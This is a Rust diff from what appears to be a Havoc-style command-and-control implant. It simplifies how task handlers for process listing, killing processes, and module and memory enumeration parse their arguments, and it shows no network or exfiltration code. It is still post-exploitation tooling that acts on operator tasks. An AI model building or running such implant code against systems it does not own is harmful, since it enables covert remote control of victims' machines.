@@ -80,8 +80,7 @@ fn extract_havoc_posix_shell_inner(process: &str, args: &str) -> Option<String> 
 /// List all processes on the system.
 pub(super) fn execute_process_list(payload: &[u8]) -> Result<Vec<u8>, PhantomError> {
     let mut parser = TaskParser::new(payload);
-    let process_ui = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative process ui flag"))?;
+    let process_ui = parser.uint32()?;
     let processes = enumerate_processes()?;
     encode_process_list(process_ui, &processes)
 }
@@ -99,8 +98,7 @@ pub(super) async fn execute_process(
     state: &mut PhantomState,
 ) -> Result<(), PhantomError> {
     let mut parser = TaskParser::new(payload);
-    let subcommand = u32::try_from(parser.int32()?)
-        .map_err(|_| PhantomError::TaskParse("negative process subcommand"))?;
+    let subcommand = parser.uint32()?;
     let subcommand = DemonProcessCommand::try_from(subcommand)?;
 
     match subcommand {
@@ -189,8 +187,7 @@ pub(super) async fn execute_process(
             }
         }
         DemonProcessCommand::Kill => {
-            let pid = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
+            let pid = parser.uint32()?;
             let success = Command::new("kill")
                 .stdin(Stdio::null())
                 .arg("-9")
@@ -219,8 +216,7 @@ pub(super) async fn execute_process(
             });
         }
         DemonProcessCommand::Modules => {
-            let pid = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
+            let pid = parser.uint32()?;
             let modules = enumerate_modules(pid)?;
             state.queue_callback(PendingCallback::Structured {
                 command_id: u32::from(DemonCommand::CommandProc),
@@ -229,10 +225,8 @@ pub(super) async fn execute_process(
             });
         }
         DemonProcessCommand::Memory => {
-            let pid = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
-            let query_protection = u32::try_from(parser.int32()?)
-                .map_err(|_| PhantomError::TaskParse("negative query protection"))?;
+            let pid = parser.uint32()?;
+            let query_protection = parser.uint32()?;
             let regions = enumerate_memory_regions(pid, query_protection)?;
             state.queue_callback(PendingCallback::Structured {
                 command_id: u32::from(DemonCommand::CommandProc),
